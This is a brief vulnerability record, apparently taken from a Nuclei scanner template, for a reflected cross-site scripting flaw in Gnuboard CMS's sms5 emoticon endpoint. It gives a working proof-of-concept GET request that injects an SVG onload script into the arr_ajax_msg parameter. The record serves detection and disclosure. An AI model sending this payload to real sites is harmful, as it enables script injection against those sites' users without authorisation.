# Vulnerability: Gnuboard CMS - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`gnuboard-sms-xss.yaml`)

## Description
Gnuboard CMS contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>
```

